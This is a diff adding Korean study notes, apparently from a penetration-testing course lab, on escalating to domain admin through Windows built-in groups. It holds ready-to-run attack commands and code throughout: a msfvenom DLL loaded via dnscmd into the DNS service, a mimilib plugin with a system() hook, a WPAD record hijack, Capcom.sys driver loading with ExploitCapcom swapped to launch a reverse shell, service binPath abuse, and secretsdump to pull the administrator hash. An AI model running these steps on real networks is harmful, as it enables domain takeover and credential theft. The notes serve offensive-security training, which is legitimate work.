@@ -374,5 +374,235 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
 <br/><br/>
 # DNS 관리자
 
+## DnsAdmins 액세스 활용
+
+### 악성 DLL 생성
+```msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll```
+
+### 로컬 HTTP 서버 시작
+```python3 -m http.server 7777```
+
+### 대상에 파일 다운로드
+```wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"```
+
+### 권한이 없는 사용자로 DLL 로드 (실패)
+```dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll```
+
+### DnsAdmins의 멤버로 DLL 로딩
+```Get-ADGroupMember -Identity DnsAdmins```
+
+### 사용자 정의 DLL 로딩 (전체 경로 지정해야 함)
+```dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll```
+
+### 사용자의 SID 찾기
+```wmic useraccount where name="netadm" get sid```
+
+### DNS 서비스에 대한 권한 확인
+```sc.exe sdshow DNS```
+
+### DNS 서비스 중지
+```sc stop dns```
+
+### DNS 서비스 시작
+```sc start dns```
+
+### 그룹 멤버십 확인
+```net group "Domain Admins" /dom```
+
+<br/><br/>
+## Cleaning Up
+
+### 레지스트리 키 추가 확인
+```reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters```
+
+### 레지스트리 키 삭제
+```reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll```
+
+### DNS 서비스 다시 시작
+```sc.exe start dns```
+
+### DNS 서비스 상태 확인
+```sc query dns```
+
+<br/><br/>
+## Mimilib.dll 사용하기
+- 참고 : [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+- [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
+- [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)
+```c
+/*	Benjamin DELPY `gentilkiwi`
+	https://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kdns.h"
+
+DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
+{
+	return ERROR_SUCCESS;
+}
+
+DWORD WINAPI kdns_DnsPluginCleanup()
+{
+	return ERROR_SUCCESS;
+}
+
+DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
+{
+	FILE * kdns_logfile;
+#pragma warning(push)
+#pragma warning(disable:4996)
+	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
+#pragma warning(pop)
+	{
+		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
+		fclose(kdns_logfile);
+	    system("ENTER COMMAND HERE");
+	}
+	return ERROR_SUCCESS;
+}
+```
+
+<br/><br/>
+## WPAD 레코드 생성
+
+### 글로벌 쿼리 차단 목록 비활성화
+```Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local```
+
+### WPAD 레코드 추가
+```Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3```
+
+<br/><br/>
+# Hyper-V 관리자
+
+- 참고 : [블로그](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)
+- [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952)
+- [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)
+
+### 대상 파일
+```C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe```
+
+### 파일 소유권 취득
+```takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe```
+
+### Mozilla 유지 관리 서비스 시작
+```sc.exe start MozillaMaintenance```
+
+<br/><br/>
+# Print Operators
+
+### 권한 확인
+```whoami /priv```
+
+### 권한 다시 확인
+- [UACMe](https://github.com/hfiref0x/UACME)
+```whoami /priv```
+
+- [드라이버 로드 도구](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
+- 다운로드 후 아래 내용 붙여넣음
+```c
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+> Windows 10 버전 1803부터는 공격 불가
+
+### cl.exe로 컴파일 (Visual Studio 2019)
+```cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp```
+
+### 드라이버에 참조 추가
+- [Capcom.sys 다운로드](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
+```reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"```
+
+### 드라이버 로드 여부 확인
+- [DriverView.exe 사용](http://www.nirsoft.net/utils/driverview.html)
+```
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+```
+
+### Privilege is Enabled 확인
+```EnableSeLoadDriverPrivilege.exe```
+
+### Capcom Driver is Listed 확인
+```
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String -pattern Capcom
+```
+
+### ExploitCapcom 도구를 사용하여 권한 확대
+- Visual Studio로 컴파일한 후 [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) 도구를 사용
+```.\ExploitCapcom.exe```
+
+<br/><br/>
+## 대체 익스플로잇 - GUI 없음
+- `ExploitCapcom.cpp` 코드를 수정하여 `"C:\\Windows\\system32\\cmd.exe"`를 `msfvenom`으로 생성된 리버스 셸 바이너리)`c:\ProgramData\revshell.exe`)로 대체
+```c
+// Launches a command shell process
+static bool LaunchShell()
+{
+    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+    PROCESS_INFORMATION ProcessInfo;
+    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
+    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
+        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
+        &ProcessInfo))
+    {
+        return false;
+    }
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+    return true;
+}
+```
+```c
+ TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+
+<br/><br/>
+## 단계 자동화
+
+### EopLoadDriver를 사용한 자동화
+- [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+```EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys```<br/>
+```.\ExploitCapcom.exe```
+
+<br/><br/>
+## Clean-up
+
+### Removing Registry Key
+```reg delete HKCU\System\CurrentControlSet\Capcom```
+
+<br/><br/>
+# Server Operators
+
+### AppReadiness Service 쿼리
+```sc qc AppReadiness```
+
+### Service Permissions with PsService 체크
+- [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)
+```.\PsService.exe security AppReadiness```
+
+### 로컬 관리자 그룹 멤버십 확인
+```net localgroup Administrators```
+
+### 서비스 바이너리 경로 수정
+```sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"```
+
+### 서비스 시작
+```sc start AppReadiness```
+
+### 로컬 관리자 그룹 멤버십 확인
+```net localgroup Administrators```
+
+### 도메인 컨트롤러에서 로컬 관리자 액세스 확인
+```crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'```
+
+### 도메인 컨트롤러에서 NTLM 암호 해시 검색
+```secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator```
 
 
